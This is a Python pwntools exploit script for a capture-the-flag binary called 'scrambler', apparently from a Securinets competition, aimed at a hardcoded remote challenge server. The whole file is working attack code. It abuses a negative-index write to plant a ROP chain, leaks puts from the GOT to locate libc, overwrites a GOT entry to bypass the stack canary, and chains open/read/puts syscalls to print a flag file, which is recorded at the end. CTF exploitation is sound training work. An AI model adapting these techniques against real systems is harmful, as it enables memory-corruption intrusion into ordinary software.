#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 20.203.124.220 --port 1235 ./scrambler
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./scrambler_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '20.203.124.220'
port = int(args.PORT or 1235)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak *0x{exe.entry:x}
# 
b *0x4013c2
continue
c
# b *0x40150c
# b *0x40143c
b *0x401556
c
# b *0x401400
b *0x401531


'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

libc = ELF("./libc.so.6")

def write_payload(idx2: int,idx3: bytes):
    for idx3_sub in idx3:
        io.sendlineafter(b"> ",b"1")
        io.sendlineafter(b'arg1 = \n> ',b"1")
        io.sendlineafter(b'arg2 = \n> ',str(idx2).encode())
        io.sendlineafter(b'arg3 = \n> ',str(idx3_sub).encode())

write_payload( -1, p8(0x80))  # counter : negative value

bss = 0x404000
pop_rdi = 0x4015c3
pop_rbp = 0x000000000040125d

p = p64(pop_rdi + 1)
p += p64(pop_rdi)
p += p64(exe.got['puts'])
p += p64(exe.plt['puts'])
p += p64(pop_rbp)
p += p64(bss+0x150)
p += p64(0x401400) 

for i, b in enumerate(p):
    write_payload( 0x28 + i, p8(b))

io.sendlineafter(b'> ', b'2')
io.recvline()
puts = u64(io.recvline().strip().ljust(8, b'\0'))
print(f'puts address: {hex(puts)}')

libc.address = puts - libc.sym.puts
print(f'libc base address: {hex(libc.address)}')

# 0x000000000009a0ff : mov qword ptr [rax], rdi ; ret
# 0x0000000000047400 : pop rax ; ret
# 0x000000000002604f : pop rsi ; ret
# 0x0000000000119241 : pop rdx ; pop r12 ; ret

mov_qword_ptr_rax_rdi_ret = libc.address + 0x9a0ff
push_rax = libc.address + 0x0000000000042047
# pop_rdi = libc.address + 0x0000000000023b72
xchg_edi_rax = libc.address + 0x00000000000f1b95

writable_addr = bss + 0x900

pop_rsi = libc.address + 0x000000000002604f
pop_rdx = libc.address + 0x0000000000119241
pop_rax = libc.address + 0x0000000000047400
syscall_ret = next(libc.search(asm("syscall ; ret")))
# mov_rax = next(libc.search(asm("mov rdi, rax ; ret")))

def syscall(rax, rdi, rsi, rdx,use_rdi=True):
    chain = b""
    if use_rdi:
        chain += p64(pop_rdi) + p64(rdi)
    chain += p64(pop_rsi) + p64(rsi)
    chain += p64(pop_rdx) + p64(rdx) + p64(0)
    chain += p64(pop_rax) + p64(rax)
    chain += p64(syscall_ret)
    return chain

p = p64(0x404150)
# Store "/home/ctf/flag.txt" in 0x404900
p += p64(pop_rdi) + b'/home/ct'
p += p64(pop_rax) + p64(writable_addr)
p += p64(mov_qword_ptr_rax_rdi_ret)
p += p64(pop_rdi) + b'f/flag.t'
p += p64(pop_rax) + p64(writable_addr + 8)
p += p64(mov_qword_ptr_rax_rdi_ret)
p += p64(pop_rdi) + b'xt\0\0\0\0\0\0'
p += p64(pop_rax) + p64(writable_addr + 16)
p += p64(mov_qword_ptr_rax_rdi_ret)
# open("/home/ctf/flag.txt", 0)
p += syscall(2, writable_addr,0,0)
# read(3,writable_addr + 32,255)
p += p64(xchg_edi_rax)
p += syscall(0,3,writable_addr + 32,255,use_rdi=False)
# puts(writable_addr + 32)
p += p64(pop_rdi) + p64(writable_addr + 32)
p += p64(libc.sym['puts'])

write_payload(-1, p8(0x80))

for i, b in enumerate(p):
    write_payload(0x28 -8 + i, p8(b))

leave = 0x0000000000401387
# overwrite got stack canary
write_payload(-0xf8, p8(0x87))
write_payload(-0xf8+1, p8(0x13))

io.sendlineafter(b'> ', b'2')

io.interactive()

# Securinets{f8ee583021b816b1b557987ca120991a}

